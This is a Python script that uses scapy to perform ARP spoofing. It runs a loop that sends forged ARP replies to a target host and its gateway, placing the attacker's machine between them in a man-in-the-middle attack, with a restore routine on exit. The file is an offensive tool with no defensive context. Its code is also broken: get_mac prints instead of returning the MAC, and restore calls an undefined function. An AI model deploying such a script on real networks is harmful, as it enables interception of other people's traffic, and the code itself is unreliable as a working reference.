import scapy.all as scapy
import argparse #works with python3
import optparse # works with python2
import time
import sys

# method to reutrn command line arguments
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target",help="Specify an target IP")
    parser.add_argument("-g","--gateway",dest="gateway",help="Specify gateway")
    value = parser.parse_args()

    if not value.target or not value.gateway:
        print("[-] Please specify target and gateway fields")
    else:
        return value    
    
# this method will return MAC of an IP address by sending a broadcast of arp_request
def get_mac(target_ip):
    arp_request_packet = scapy.ARP(pdst=target_ip)
    broadcast_mac = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast_mac/arp_request_packet
    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    print(answered_list[0][1].hwsrc)

# this method will send arp packet (response) with specified target ip and it's MAC along with spoofed ip
def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    arp_response_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(arp_response_packet,verbose=False)

# this method will restore ARP table when we are done with MITM attack
def restore(dest_ip,src_ip):
    dst_mac = get(dest_ip)
    src_mac = get(src_ip)
    arp_response_packet = scapy.ARP(op=2,pdst=dest_ip,psrc=src_ip,hwdst=dst_mac,hwsrc=src_mac)
    scapy.send(arp_response_packet,verbose=False,count=4)


value = get_args()
num_of_packets = 0
try :
    while True:
        spoof(value.target,value.gateway)
        spoof(value.gateway,value.target)
        num_of_packets = num_of_packets + 2
        print("\r[+]Send Two Packets"+str(num_of_packets)), # save it in a buffer
        #print("\r[+]Send Two Packets"+(str)num_of_packets,end="") python3 
        sys.stdout.flush() # do not flush the buffer , no needed for python3 
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Detected Ctrl+C , Quiting")
    restore(value.target,value.gateway)
    restore(value.gateway,value.target)   